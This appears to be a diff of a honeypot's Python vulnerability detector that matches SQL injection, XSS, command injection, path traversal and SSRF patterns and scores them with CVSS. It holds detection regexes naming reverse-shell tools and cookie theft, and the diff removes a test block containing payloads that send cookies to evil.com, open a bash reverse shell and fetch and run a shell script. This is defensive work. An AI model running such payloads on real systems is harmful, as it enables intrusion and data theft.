@@ -1,12 +1,15 @@
 """
-Enhanced Vulnerability Detector with Dynamic CVSS Calculation
-Replaces the static cvss_score with dynamic analysis based on actual payloads.
+Pattern-based vulnerability detector with dynamic CVSS scoring.
 """
 
 import re
 from dataclasses import dataclass
 from typing import Any, Dict, List, Optional, Pattern, Tuple
-from .dynamic_cvss_calculator import DynamicCVSSCalculator
+
+try:
+    from .dynamic_cvss_calculator import DynamicCVSSCalculator
+except Exception:
+    DynamicCVSSCalculator = None  # type: ignore[assignment]
 
 
 @dataclass(frozen=True)
@@ -18,7 +21,6 @@ class _Rule:
     keyword: str
     remediation: str
     patterns: Tuple[Pattern[str], ...]
-    # NOTE: cvss_score and cvss_vector are removed - calculated dynamically now
 
 
 def _rx(pattern: str) -> Pattern[str]:
@@ -39,7 +41,7 @@ _RULES: Tuple[_Rule, ...] = (
             _rx(r"--\s*$"),
             _rx(r"/\*.*\*/"),
             _rx(r"\bdrop\b\s+\btable\b"),
-            _rx(r"(xp_cmdshell|exec\s+master|sp_executesql)"),  # Added for better detection
+            _rx(r"(xp_cmdshell|exec\s+master|sp_executesql)"),
             _rx(r"(load_file|into\s+outfile|into\s+dumpfile)"),
         ),
     ),
@@ -57,7 +59,7 @@ _RULES: Tuple[_Rule, ...] = (
             _rx(r"javascript\s*:"),
             _rx(r"<\s*img\b[^>]*\bon\w+\s*="),
             _rx(r"<\s*svg\b[^>]*\bon\w+\s*="),
-            _rx(r"(document\.cookie|localStorage|sessionStorage)"),  # Enhanced
+            _rx(r"(document\.cookie|localStorage|sessionStorage)"),
         ),
     ),
     _Rule(
@@ -71,7 +73,7 @@ _RULES: Tuple[_Rule, ...] = (
             _rx(r"(;|\|\||&&|\|)\s*(ls|cat|whoami|id|pwd|curl|wget|nc|bash|sh)\b"),
             _rx(r"`[^`]{1,200}`"),
             _rx(r"\$\([^)]{1,200}\)"),
-            _rx(r"(/bin/(bash|sh)|nc\s+-e|mkfifo)"),  # Enhanced for reverse shells
+            _rx(r"(/bin/(bash|sh)|nc\s+-e|mkfifo)"),
         ),
     ),
     _Rule(
@@ -99,8 +101,8 @@ _RULES: Tuple[_Rule, ...] = (
         remediation="Block internal IP ranges, use allowlists for outbound requests, and disable metadata access.",
         patterns=(
             _rx(r"https?://(localhost|127\.0\.0\.1)"),
-            _rx(r"https?://169\.254\.169\.254"),  # AWS/Azure metadata
-            _rx(r"https?://(192\.168\.|10\.|172\.(1[6-9]|2[0-9]|3[01])\.)"),  # Internal IPs
+            _rx(r"https?://169\.254\.169\.254"),
+            _rx(r"https?://(192\.168\.|10\.|172\.(1[6-9]|2[0-9]|3[01])\.)"),
         ),
     ),
 )
@@ -108,30 +110,21 @@ _RULES: Tuple[_Rule, ...] = (
 
 class EnhancedVulnerabilityDetector:
     """
-    Enhanced vulnerability detector with dynamic CVSS 3.1 calculation.
-    
-    Key improvements over static detection:
-    - Calculates CVSS scores based on actual payload content
-    - Analyzes attack complexity and impact dynamically
-    - Uses threat intelligence from Kaggle, HackerOne, CVE databases
-    - Provides detailed breakdown of CVSS metrics
+    Pattern-based vulnerability detector with optional dynamic CVSS scoring.
     """
-    
+
     def __init__(self):
         self.rules = _RULES
-        self.cvss_calculator = DynamicCVSSCalculator()
-    
+        self.cvss_calculator = None
+        if DynamicCVSSCalculator is not None:
+            try:
+                self.cvss_calculator = DynamicCVSSCalculator()
+            except Exception:
+                self.cvss_calculator = None
+
     def detect(self, data: Dict[str, Any]) -> List[Dict[str, Any]]:
-        """
-        Detect vulnerabilities with dynamic CVSS calculation.
-        
-        Args:
-            data: Request data containing potential attack payloads
-            
-        Returns:
-            List of detected vulnerabilities with dynamic CVSS scores
-        """
         findings: List[Dict[str, Any]] = []
+        seen: set[Tuple[str, str, str]] = set()
 
         candidates = self._candidate_fields(data)
         if not candidates:
@@ -142,23 +135,25 @@ class EnhancedVulnerabilityDetector:
             if evidence is None:
                 continue
 
-            # Extract the matched payload for analysis
-            matched_payload = evidence.get("match", "")
-            matched_field = evidence.get("field", "")
-            
-            # Build context for CVSS calculation
+            dedupe_key = (
+                rule.attack_type,
+                str(evidence.get("field", "")),
+                str(evidence.get("match", "")).lower(),
+            )
+            if dedupe_key in seen:
+                continue
+            seen.add(dedupe_key)
+
+            matched_payload = str(evidence.get("match", ""))
+            matched_field = str(evidence.get("field", ""))
+
             context = {
                 "field": matched_field,
                 "stored": self._is_stored_field(matched_field),
-                "full_payload": evidence.get("value", "")
+                "full_payload": str(evidence.get("value", "")),
             }
-            
-            # **DYNAMIC CVSS CALCULATION** - This is the key improvement!
-            cvss_result = self.cvss_calculator.calculate_cvss(
-                attack_type=rule.attack_type,
-                payload=matched_payload,
-                context=context
-            )
+
+            cvss_result = self._calculate_cvss(rule.attack_type, matched_payload, context)
 
             findings.append(
                 {
@@ -166,131 +161,108 @@ class EnhancedVulnerabilityDetector:
                     "attack_type": rule.attack_type,
                     "name": rule.name,
                     "owasp": rule.owasp,
-                    
-                    # Dynamic CVSS values (replaces static scores)
                     "cvss_score": cvss_result["cvss_score"],
                     "cvss_vector": cvss_result["cvss_vector"],
                     "severity": cvss_result["severity"],
-                    
                     "keyword": rule.keyword,
                     "remediation": rule.remediation,
                     "evidence": evidence,
-                    
-                    # Additional metadata for transparency
-                    "cvss_metrics": cvss_result["metrics"],
-                    "payload_analysis": cvss_result["analysis"]
+                    "cvss_metrics": cvss_result.get("metrics", {}),
+                    "payload_analysis": cvss_result.get("analysis", {}),
                 }
             )
 
-        # Sort by dynamic CVSS score (highest first)
-        findings.sort(key=lambda x: x.get("cvss_score", 0.0), reverse=True)
+        findings.sort(key=lambda x: float(x.get("cvss_score", 0.0)), reverse=True)
         return findings
+
+    def _calculate_cvss(self, attack_type: str, payload: str, context: Dict[str, Any]) -> Dict[str, Any]:
+        if self.cvss_calculator is not None:
+            try:
+                return self.cvss_calculator.calculate_cvss(
+                    attack_type=attack_type,
+                    payload=payload,
+                    context=context,
+                )
+            except Exception:
+                pass
+
+        fallback_scores = {
+            "sql_injection": 7.1,
+            "xss": 6.1,
+            "command_injection": 9.8,
+            "path_traversal": 6.5,
+            "ssrf": 8.2,
+        }
+        score = fallback_scores.get(attack_type, 5.0)
+        return {
+            "cvss_score": score,
+            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
+            "severity": self._severity_from_cvss(score),
+            "metrics": {},
+            "analysis": {
+                "payload_length": len(payload),
+                "attack_type": attack_type,
+                "context": context,
+                "fallback": True,
+            },
+        }
+
+    @staticmethod
+    def _severity_from_cvss(score: float) -> str:
+        if score >= 9.0:
+            return "CRITICAL"
+        if score >= 7.0:
+            return "HIGH"
+        if score >= 4.0:
+            return "MEDIUM"
+        if score > 0.0:
+            return "LOW"
+        return "NONE"
 
     @staticmethod
     def _candidate_fields(data: Dict[str, Any]) -> List[Dict[str, str]]:
-        """Extract fields that should be checked for attacks"""
-        fields = []
-        for key in ("email", "password", "username", "payload", "query", "input", "comment", "filename", "path"):
+        fields: List[Dict[str, str]] = []
+        for key in (
+            "email",
+            "password",
+            "username",
+            "payload",
+            "query",
+            "input",
+            "comment",
+            "filename",
+            "path",
+            "body",
+            "url",
+            "endpoint",
+        ):
             if key in data and data[key] is not None:
                 fields.append({"field": key, "value": str(data[key])})
         return fields
 
     @staticmethod
     def _match_rule(rule: _Rule, fields: List[Dict[str, str]]) -> Optional[Dict[str, Any]]:
-        """Check if any field matches the rule patterns"""
         for item in fields:
             value = item["value"]
             for pattern in rule.patterns:
-                m = pattern.search(value)
-                if not m:
+                match = pattern.search(value)
+                if not match:
                     continue
-                snippet = value[m.start() : m.end()]
-                snippet = snippet[:200]
+                snippet = value[match.start() : match.end()][:200]
                 return {
-                    "field": item["field"], 
+                    "field": item["field"],
                     "match": snippet,
-                    "value": value  # Include full value for better analysis
+                    "value": value,
                 }
         return None
-    
+
     @staticmethod
     def _is_stored_field(field_name: str) -> bool:
-        """
-        Determine if a field is likely to be stored (affects XSS severity).
-        Stored fields have higher impact as the attack persists.
-        """
-        stored_fields = {"comment", "bio", "description", "message", "post", "review"}
-        return field_name.lower() in stored_fields
+        return field_name.lower() in {"comment", "bio", "description", "message", "post", "review"}
 
 
 class VulnerabilityDetector(EnhancedVulnerabilityDetector):
-    """
-    Backwards‑compatible alias so existing imports like:
+    """Backwards-compatible class alias."""
 
-        from honeypot.vuln_detector import VulnerabilityDetector
-
-    continue to work. The implementation is provided by
-    `EnhancedVulnerabilityDetector` above.
-    """
     pass
 
-
-# Example usage and testing
-if __name__ == "__main__":
-    detector = EnhancedVulnerabilityDetector()
-    
-    # Test Case 1: Simple SQL injection (should get lower score)
-    test1 = {
-        "email": "user@example.com' OR 1=1--",
-        "password": "test123"
-    }
-    result1 = detector.detect(test1)
-    print("\n=== Test 1: Simple SQLi ===")
-    for vuln in result1:
-        print(f"{vuln['name']}: {vuln['cvss_score']} ({vuln['severity']})")
-        print(f"  Vector: {vuln['cvss_vector']}")
-        print(f"  Evidence: {vuln['evidence']}")
-    
-    # Test Case 2: Advanced SQL injection with command execution (should get CRITICAL score)
-    test2 = {
-        "username": "admin'; exec master..xp_cmdshell 'whoami'--",
-        "password": "test"
-    }
-    result2 = detector.detect(test2)
-    print("\n=== Test 2: Advanced SQLi with RCE ===")
-    for vuln in result2:
-        print(f"{vuln['name']}: {vuln['cvss_score']} ({vuln['severity']})")
-        print(f"  Vector: {vuln['cvss_vector']}")
-        print(f"  Metrics: {vuln['cvss_metrics']}")
-    
-    # Test Case 3: Stored XSS (should get higher score than reflected)
-    test3 = {
-        "comment": "<script>fetch('http://evil.com?c='+document.cookie)</script>",
-        "username": "attacker"
-    }
-    result3 = detector.detect(test3)
-    print("\n=== Test 3: Stored XSS ===")
-    for vuln in result3:
-        print(f"{vuln['name']}: {vuln['cvss_score']} ({vuln['severity']})")
-        print(f"  Vector: {vuln['cvss_vector']}")
-    
-    # Test Case 4: Command injection with reverse shell
-    test4 = {
-        "filename": "file.txt; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
-    }
-    result4 = detector.detect(test4)
-    print("\n=== Test 4: Command Injection with Reverse Shell ===")
-    for vuln in result4:
-        print(f"{vuln['name']}: {vuln['cvss_score']} ({vuln['severity']})")
-        print(f"  Vector: {vuln['cvss_vector']}")
-        print(f"  Analysis: {vuln['payload_analysis']}")
-    
-    # Test Case 5: Multiple attacks in same payload
-    test5 = {
-        "query": "'; DROP TABLE users; exec xp_cmdshell 'curl http://evil.com/shell.sh | sh'--"
-    }
-    result5 = detector.detect(test5)
-    print("\n=== Test 5: Multi-stage Attack ===")
-    for vuln in result5:
-        print(f"{vuln['name']}: {vuln['cvss_score']} ({vuln['severity']})")
-        print(f"  Vector: {vuln['cvss_vector']}")
